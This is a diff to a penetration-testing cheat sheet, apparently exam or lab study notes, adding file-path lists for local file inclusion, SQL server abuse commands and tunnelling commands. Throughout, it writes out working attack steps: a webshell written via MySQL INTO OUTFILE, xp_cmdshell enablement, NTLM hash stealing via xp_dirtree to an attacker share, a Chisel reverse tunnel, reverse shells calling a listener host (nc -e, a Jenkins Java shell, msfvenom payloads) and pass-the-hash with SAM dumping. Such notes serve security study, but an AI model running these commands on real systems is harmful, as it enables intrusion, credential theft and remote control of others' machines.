@@ -2,6 +2,360 @@
 
 # General
 
+## Important Locations
+
+<details>
+<summary>Windows</summary>
+Windows
+    
+    C:/Users/Administrator/NTUser.dat
+    C:/Documents and Settings/Administrator/NTUser.dat
+    C:/apache/logs/access.log
+    C:/apache/logs/error.log
+    C:/apache/php/php.ini
+    C:/boot.ini
+    C:/inetpub/wwwroot/global.asa
+    C:/MySQL/data/hostname.err
+    C:/MySQL/data/mysql.err
+    C:/MySQL/data/mysql.log
+    C:/MySQL/my.cnf
+    C:/MySQL/my.ini
+    C:/php4/php.ini
+    C:/php5/php.ini
+    C:/php/php.ini
+    C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+    C:/Program Files/Apache Group/Apache/conf/httpd.conf
+    C:/Program Files/Apache Group/Apache/logs/access.log
+    C:/Program Files/Apache Group/Apache/logs/error.log
+    C:/Program Files/FileZilla Server/FileZilla Server.xml
+    C:/Program Files/MySQL/data/hostname.err
+    C:/Program Files/MySQL/data/mysql-bin.log
+    C:/Program Files/MySQL/data/mysql.err
+    C:/Program Files/MySQL/data/mysql.log
+    C:/Program Files/MySQL/my.ini
+    C:/Program Files/MySQL/my.cnf
+    C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+    C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+    C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+    C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
+    C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+    C:/Program Files (x86)/Apache Group/Apache/conf/access.log
+    C:/Program Files (x86)/Apache Group/Apache/conf/error.log
+    C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
+    C:/Program Files (x86)/xampp/apache/conf/httpd.conf
+    C:/WINDOWS/php.ini
+    C:/WINDOWS/Repair/SAM
+    C:/Windows/repair/system
+    C:/Windows/repair/software
+    C:/Windows/repair/security
+    C:/WINDOWS/System32/drivers/etc/hosts
+    C:/Windows/win.ini
+    C:/WINNT/php.ini
+    C:/WINNT/win.ini
+    C:/xampp/apache/bin/php.ini
+    C:/xampp/apache/logs/access.log
+    C:/xampp/apache/logs/error.log
+    C:/Windows/Panther/Unattend/Unattended.xml
+    C:/Windows/Panther/Unattended.xml
+    C:/Windows/debug/NetSetup.log
+    C:/Windows/system32/config/AppEvent.Evt
+    C:/Windows/system32/config/SecEvent.Evt
+    C:/Windows/system32/config/default.sav
+    C:/Windows/system32/config/security.sav
+    C:/Windows/system32/config/software.sav
+    C:/Windows/system32/config/system.sav
+    C:/Windows/system32/config/regback/default
+    C:/Windows/system32/config/regback/sam
+    C:/Windows/system32/config/regback/security
+    C:/Windows/system32/config/regback/system
+    C:/Windows/system32/config/regback/software
+    C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+    C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+    C:/Windows/System32/inetsrv/config/applicationHost.config
+    C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+</details>
+<details>
+<summary>Linux</summary>
+    
+    /etc/passwd
+    /etc/shadow
+    /etc/aliases
+    /etc/anacrontab
+    /etc/apache2/apache2.conf
+    /etc/apache2/httpd.conf
+    /etc/apache2/sites-enabled/000-default.conf
+    /etc/at.allow
+    /etc/at.deny
+    /etc/bashrc
+    /etc/bootptab
+    /etc/chrootUsers
+    /etc/chttp.conf
+    /etc/cron.allow
+    /etc/cron.deny
+    /etc/crontab
+    /etc/cups/cupsd.conf
+    /etc/exports
+    /etc/fstab
+    /etc/ftpaccess
+    /etc/ftpchroot
+    /etc/ftphosts
+    /etc/groups
+    /etc/grub.conf
+    /etc/hosts
+    /etc/hosts.allow
+    /etc/hosts.deny
+    /etc/httpd/access.conf
+    /etc/httpd/conf/httpd.conf
+    /etc/httpd/httpd.conf
+    /etc/httpd/logs/access_log
+    /etc/httpd/logs/access.log
+    /etc/httpd/logs/error_log
+    /etc/httpd/logs/error.log
+    /etc/httpd/php.ini
+    /etc/httpd/srm.conf
+    /etc/inetd.conf
+    /etc/inittab
+    /etc/issue
+    /etc/knockd.conf
+    /etc/lighttpd.conf
+    /etc/lilo.conf
+    /etc/logrotate.d/ftp
+    /etc/logrotate.d/proftpd
+    /etc/logrotate.d/vsftpd.log
+    /etc/lsb-release
+    /etc/motd
+    /etc/modules.conf
+    /etc/motd
+    /etc/mtab
+    /etc/my.cnf
+    /etc/my.conf
+    /etc/mysql/my.cnf
+    /etc/network/interfaces
+    /etc/networks
+    /etc/npasswd
+    /etc/passwd
+    /etc/php4.4/fcgi/php.ini
+    /etc/php4/apache2/php.ini
+    /etc/php4/apache/php.ini
+    /etc/php4/cgi/php.ini
+    /etc/php4/apache2/php.ini
+    /etc/php5/apache2/php.ini
+    /etc/php5/apache/php.ini
+    /etc/php/apache2/php.ini
+    /etc/php/apache/php.ini
+    /etc/php/cgi/php.ini
+    /etc/php.ini
+    /etc/php/php4/php.ini
+    /etc/php/php.ini
+    /etc/printcap
+    /etc/profile
+    /etc/proftp.conf
+    /etc/proftpd/proftpd.conf
+    /etc/pure-ftpd.conf
+    /etc/pureftpd.passwd
+    /etc/pureftpd.pdb
+    /etc/pure-ftpd/pure-ftpd.conf
+    /etc/pure-ftpd/pure-ftpd.pdb
+    /etc/pure-ftpd/putreftpd.pdb
+    /etc/redhat-release
+    /etc/resolv.conf
+    /etc/samba/smb.conf
+    /etc/snmpd.conf
+    /etc/ssh/ssh_config
+    /etc/ssh/sshd_config
+    /etc/ssh/ssh_host_dsa_key
+    /etc/ssh/ssh_host_dsa_key.pub
+    /etc/ssh/ssh_host_key
+    /etc/ssh/ssh_host_key.pub
+    /etc/sysconfig/network
+    /etc/syslog.conf
+    /etc/termcap
+    /etc/vhcs2/proftpd/proftpd.conf
+    /etc/vsftpd.chroot_list
+    /etc/vsftpd.conf
+    /etc/vsftpd/vsftpd.conf
+    /etc/wu-ftpd/ftpaccess
+    /etc/wu-ftpd/ftphosts
+    /etc/wu-ftpd/ftpusers
+    /logs/pure-ftpd.log
+    /logs/security_debug_log
+    /logs/security_log
+    /opt/lampp/etc/httpd.conf
+    /opt/xampp/etc/php.ini
+    /proc/cmdline
+    /proc/cpuinfo
+    /proc/filesystems
+    /proc/interrupts
+    /proc/ioports
+    /proc/meminfo
+    /proc/modules
+    /proc/mounts
+    /proc/net/arp
+    /proc/net/tcp
+    /proc/net/udp
+    /proc/<PID>/cmdline
+    /proc/<PID>/maps
+    /proc/sched_debug
+    /proc/self/cwd/app.py
+    /proc/self/environ
+    /proc/self/net/arp
+    /proc/stat
+    /proc/swaps
+    /proc/version
+    /root/anaconda-ks.cfg
+    /usr/etc/pure-ftpd.conf
+    /usr/lib/php.ini
+    /usr/lib/php/php.ini
+    /usr/local/apache/conf/modsec.conf
+    /usr/local/apache/conf/php.ini
+    /usr/local/apache/log
+    /usr/local/apache/logs
+    /usr/local/apache/logs/access_log
+    /usr/local/apache/logs/access.log
+    /usr/local/apache/audit_log
+    /usr/local/apache/error_log
+    /usr/local/apache/error.log
+    /usr/local/cpanel/logs
+    /usr/local/cpanel/logs/access_log
+    /usr/local/cpanel/logs/error_log
+    /usr/local/cpanel/logs/license_log
+    /usr/local/cpanel/logs/login_log
+    /usr/local/cpanel/logs/stats_log
+    /usr/local/etc/httpd/logs/access_log
+    /usr/local/etc/httpd/logs/error_log
+    /usr/local/etc/php.ini
+    /usr/local/etc/pure-ftpd.conf
+    /usr/local/etc/pureftpd.pdb
+    /usr/local/lib/php.ini
+    /usr/local/php4/httpd.conf
+    /usr/local/php4/httpd.conf.php
+    /usr/local/php4/lib/php.ini
+    /usr/local/php5/httpd.conf
+    /usr/local/php5/httpd.conf.php
+    /usr/local/php5/lib/php.ini
+    /usr/local/php/httpd.conf
+    /usr/local/php/httpd.conf.ini
+    /usr/local/php/lib/php.ini
+    /usr/local/pureftpd/etc/pure-ftpd.conf
+    /usr/local/pureftpd/etc/pureftpd.pdn
+    /usr/local/pureftpd/sbin/pure-config.pl
+    /usr/local/www/logs/httpd_log
+    /usr/local/Zend/etc/php.ini
+    /usr/sbin/pure-config.pl
+    /var/adm/log/xferlog
+    /var/apache2/config.inc
+    /var/apache/logs/access_log
+    /var/apache/logs/error_log
+    /var/cpanel/cpanel.config
+    /var/lib/mysql/my.cnf
+    /var/lib/mysql/mysql/user.MYD
+    /var/local/www/conf/php.ini
+    /var/log/apache2/access_log
+    /var/log/apache2/access.log
+    /var/log/apache2/error_log
+    /var/log/apache2/error.log
+    /var/log/apache/access_log
+    /var/log/apache/access.log
+    /var/log/apache/error_log
+    /var/log/apache/error.log
+    /var/log/apache-ssl/access.log
+    /var/log/apache-ssl/error.log
+    /var/log/auth.log
+    /var/log/boot
+    /var/htmp
+    /var/log/chttp.log
+    /var/log/cups/error.log
+    /var/log/daemon.log
+    /var/log/debug
+    /var/log/dmesg
+    /var/log/dpkg.log
+    /var/log/exim_mainlog
+    /var/log/exim/mainlog
+    /var/log/exim_paniclog
+    /var/log/exim.paniclog
+    /var/log/exim_rejectlog
+    /var/log/exim/rejectlog
+    /var/log/faillog
+    /var/log/ftplog
+    /var/log/ftp-proxy
+    /var/log/ftp-proxy/ftp-proxy.log
+    /var/log/httpd-access.log
+    /var/log/httpd/access_log
+    /var/log/httpd/access.log
+    /var/log/httpd/error_log
+    /var/log/httpd/error.log
+    /var/log/httpsd/ssl.access_log
+    /var/log/httpsd/ssl_log
+    /var/log/kern.log
+    /var/log/lastlog
+    /var/log/lighttpd/access.log
+    /var/log/lighttpd/error.log
+    /var/log/lighttpd/lighttpd.access.log
+    /var/log/lighttpd/lighttpd.error.log
+    /var/log/mail.info
+    /var/log/mail.log
+    /var/log/maillog
+    /var/log/mail.warn
+    /var/log/message
+    /var/log/messages
+    /var/log/mysqlderror.log
+    /var/log/mysql.log
+    /var/log/mysql/mysql-bin.log
+    /var/log/mysql/mysql.log
+    /var/log/mysql/mysql-slow.log
+    /var/log/proftpd
+    /var/log/pureftpd.log
+    /var/log/pure-ftpd/pure-ftpd.log
+    /var/log/secure
+    /var/log/vsftpd.log
+    /var/log/wtmp
+    /var/log/xferlog
+    /var/log/yum.log
+    /var/mysql.log
+    /var/run/utmp
+    /var/spool/cron/crontabs/root
+    /var/webmin/miniserv.log
+    /var/www/html<VHOST>/__init__.py
+    /var/www/html/db_connect.php
+    /var/www/html/utils.php
+    /var/www/log/access_log
+    /var/www/log/error_log
+    /var/www/logs/access_log
+    /var/www/logs/error_log
+    /var/www/logs/access.log
+    /var/www/logs/error.log
+    ~/.atfp_history
+    ~/.bash_history
+    ~/.bash_logout
+    ~/.bash_profile
+    ~/.bashrc
+    ~/.gtkrc
+    ~/.login
+    ~/.logout
+    ~/.mysql_history
+    ~/.nano_history
+    ~/.php_history
+    ~/.profile
+    ~/.ssh/authorized_keys
+    #id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
+    ~/.ssh/id_dsa
+    ~/.ssh/id_dsa.pub
+    ~/.ssh/id_rsa
+    ~/.ssh/id_edcsa
+    ~/.ssh/id_rsa.pub
+    ~/.ssh/identity
+    ~/.ssh/identity.pub
+    ~/.viminfo
+    ~/.wm_style
+    ~/.Xdefaults
+    ~/.xinitrc
+    ~/.Xresources
+    ~/.xsession
+</details>
+
 ## RDP
 ```
 xfreerdp /u:uname /p:'pass' /v:IP
@@ -228,7 +582,7 @@ gpp-decrypt "cpassword"
 
 ## Evil-Winrm
 
-```bash
+```
 ##winrm service discovery
 nmap -p5985,5986 <IP>
 5985 - plaintext protocol
@@ -269,7 +623,7 @@ Invoke-Binary /opt/privsc/winPEASx64.exe
 
 ## Mimikatz
 
-```powershell
+```
 privilege::debug
 
 token::elevate
@@ -286,7 +640,7 @@ lsadump::lsa /patch #both these dump SAM
 
 ## Ligolo-ng
 
-```powershell
+```
 #Creating interface and starting it.
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
@@ -319,6 +673,16 @@ start #after adding relevent subnet to ligolo interface
 sudo ip r add <subnet> dev ligolo
 
 ```
+## Chisel
+```
+# TCP/UDP tunnel / proxy https://github.com/jpillora/chisel
+# On Kali
+./chisel server --reverse --port 9001
+# On Windows
+.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
+
+```
+
 # Services
 
 ## FTP enumeration
@@ -437,10 +801,12 @@ mget *
 
 - View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
 - Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
+- Check the http title on ports for potential services with vulns
 - check /robots.txt folder
 - Look for the hostname and add the relevant one to `/etc/hosts` file.
 - Directory and file discovery - Obtain any hidden files that may contain juicy information
 - Use curl to check heaaders for versions: curl -I <ip>
+- Try multiple wordlists if stuck
 
 ```
 dirbuster
@@ -485,6 +851,7 @@ curl -i http://192.168.50.16:5002/users/v1
 ```
 
 - If there is any Input field check for **Remote Code execution** or **SQL Injection**
+- Any input boxes that take a url, test with a python server you host
 - Check the URL, whether we can leverage **Local or Remote File Inclusion**.
 - Also check if there’s any file upload utility (also obtain the location it’s getting reflected)
 
@@ -639,6 +1006,80 @@ netshareenum #Share enumeration, this only comesup if the current user we're log
 netshareenumall
 lsaenumsid #SID of all users
 ```
+## SQL
+# Connecting to the MySQL server.
+mysql -u julio -pPassword123 -h 10.129.20.13
+
+# Connecting to the MSSQL server.
+sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30
+
+# Connecting to the MSSQL server from Linux.
+sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+
+# Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.
+sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+
+# Show all available databases in MySQL.
+mysql> SHOW DATABASES;
+
+# Select a specific database in MySQL.
+mysql> USE htbusers;
+
+# Show all available tables in the selected database in MySQL.
+mysql> SHOW TABLES;
+
+# Select all available entries from the "users" table in MySQL.
+mysql> SELECT * FROM users;
+
+# Show all available databases in MSSQL.
+sqlcmd> SELECT name FROM master.dbo.sysdatabases
+
+# Select a specific database in MSSQL.
+sqlcmd> USE htbusers
+
+# Show all available tables in the selected database in MSSQL.
+sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
+
+# Select all available entries from the "users" table in MSSQL.
+sqlcmd> SELECT * FROM users
+
+# To allow advanced options to be changed.
+sqlcmd> EXECUTE sp_configure 'show advanced options', 1
+
+# To enable the xp_cmdshell.
+sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
+
+# To be used after each sp_configure command to apply the changes.
+sqlcmd> RECONFIGURE
+
+# Execute a system command from MSSQL server.
+sqlcmd> xp_cmdshell 'whoami'
+
+# Create a file using MySQL.
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
+
+# Check if the the secure file privileges are empty to read locally stored files on the system.
+mysql> show variables like "secure_file_priv";
+
+# Read local files in MSSQL.
+sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+# Read local files in MySQL.
+mysql> select LOAD_FILE("/etc/passwd");
+
+# Hash stealing using the xp_dirtree command in MSSQL.
+sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+
+# Hash stealing using the xp_subdirs command in MSSQL.
+sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+
+# Identify linked servers in MSSQL.
+sqlcmd> SELECT srvname, isremote FROM sysservers
+
+# Identify the user and its privileges used for the remote connection in MSSQL.
+sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+
 
 # Web Attacks
 
@@ -646,6 +1087,12 @@ lsaenumsid #SID of all users
 💡 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
 </aside>
+# Usual Attack Vectors
+- Input Field => Remote Code Execution (RCE), SQL Injection (SQLi)
+- URL => Directory Traversal, Local/Remote File Exclusion
+- File Upload => Web/Reverse Shell (can be .exe, .php, .lsp, .aspx, .jsp) # Refer to /usr/share/webshells
+- Login/Register Form => Default/Common Credentials, Reset Password Abuse
+- About Us/Team Page => First name can be valid usernames
 
 ## Directory Traversal
 
@@ -809,7 +1256,7 @@ or pentestmonkey reverse shell
 
 - For Jenkins
 
-```powershell
+```
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
@@ -825,7 +1272,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## Manual Enumeration commands
 
-```bash
+```
 #Groups we're part of
 whoami /groups
 
@@ -859,7 +1306,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 
 ## Automated Scripts
 
-```bash
+```
 winpeas.exe
 winpeas.bat
 Jaws-enum.ps1
@@ -871,7 +1318,7 @@ PrivescCheck.ps1
 
 - Command to check `whoami /priv`
 
-```powershell
+```
 #Printspoofer
 PrintSpoofer.exe -i -c powershell.exe 
 PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
@@ -895,7 +1342,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ### Binary Hijacking
 
-```powershell
+```
 #Identify service from winpeas
 icalcs "path" #F means full permission, we need to check we have full access on the folder
 sc qc <servicename> #find binary path variable
@@ -905,7 +1352,7 @@ sc start <servicename>
 
 ### Unquoted Service Path
 
-```bash
+```
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
 #Check the Writable path
 icalcs "path"
@@ -915,7 +1362,7 @@ sc start <servicename>
 
 ### Insecure Service Executables
 
-```bash
+```
 #In Winpeas look for a service which has the following
 File Permissions: Everyone [AllAccess]
 #Replace the executable in the service folder and start the service
@@ -924,7 +1371,7 @@ sc start <service>
 
 ### Weak Registry permissions
 
-```bash
+```
 #Look for the following in Winpeas services info output
 HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
 
@@ -952,7 +1399,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 
 ## Autorun
 
-```powershell
+```
 #For checking, it will display some information with file-location
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@@ -965,7 +1412,7 @@ accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
 
 ## AlwaysInstallElevated
 
-```powershell
+```
 #For checking, it should return 1 or Ox1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -979,7 +1426,7 @@ msiexec /quiet /qn /i reverse.msi
 
 ## Schedules Tasks
 
-```bash
+```
 schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
 #Permission check - Writable means exploitable!
 icalcs "path"
@@ -988,7 +1435,7 @@ icalcs "path"
 
 ## Startup Apps
 
-```bash
+```
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
 #Check writable permissions and transfer
 #The only catch here is the system needs to be restarted
@@ -996,7 +1443,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applicatio
 
 ## Insecure GUI apps
 
-```bash
+```
 #Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
 #Open that particular application, using "open" feature enter the following
 file://c:/windows/system32/cmd.exe 
@@ -1006,7 +1453,7 @@ file://c:/windows/system32/cmd.exe
 
 - Check in the following folders
 
-```bash
+```
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\SAM
@@ -1024,7 +1471,7 @@ dir /s SYSTEM
 
 - Obtaining Hashes from SYSTEM and SAM
 
-```bash
+```
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
 #Now a detailed list of hashes are displayed
 ```
@@ -1033,7 +1480,7 @@ impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the 
 
 ### Sensitive files
 
-```bash
+```
 findstr /si password *.txt  
 findstr /si password *.xml  
 findstr /si password *.ini  
@@ -1049,7 +1496,7 @@ findstr /spin "password" *.*
 
 ### Config files
 
-```bash
+```
 c:\sysprep.inf  
 c:\sysprep\sysprep.xml  
 c:\unattend.xml  
@@ -1069,7 +1516,7 @@ dir c:\ /s /b | findstr /si *vnc.ini
 
 ### Registry
 
-```bash
+```
 reg query HKLM /f password /t REG_SZ /s
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
@@ -1098,7 +1545,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 ### RunAs - Savedcreds
 
-```bash
+```
 cmdkey /list #Displays stored credentials looks for any optential users
 #Transfer the reverseshell
 runas /savecred /user:admin C:\Temp\reverse.exe
@@ -1106,7 +1553,7 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 
 ### Pass the Hash
 
-```bash
+```
 #If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
 ```
@@ -1116,6 +1563,7 @@ pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX2
 # Linux Privilege Escalation
 
 - [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
+- If see a sh script (like for a cron job etc), look at what tools are used in the script and if any have RCE's on github
 
 ## TTY Shell
 
@@ -1126,6 +1574,12 @@ echo 'os.system('/bin/bash')'
 /bin/sh -i
 /bin/bash -i
 perl -e 'exec "/bin/sh";'
+
+python3 -c 'import pty;pty.spawn("bash")' python3 -c 'import pty;pty.spawn("bash")'
+control + z
+stty raw -echo ; fg
+reset
+screen
 ```
 
 ## Basic
@@ -1136,6 +1590,7 @@ dpkg -l #Installed applications on Debian system
 cat /etc/fstab #Listing mounted drives
 lsblk #Listing all available drives
 lsmod #Listing loaded drivers
+grep -rnw . -e 'word' # find word in files
 
 watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
 sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump
@@ -1169,6 +1624,7 @@ watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
 ```bash
 sudo -l
 find / -perm -u=s -type f 2>/dev/null
+find / -perm /4000 -ls 2>/dev/null | grep php
 getcap -r / 2>/dev/null
 ```
 
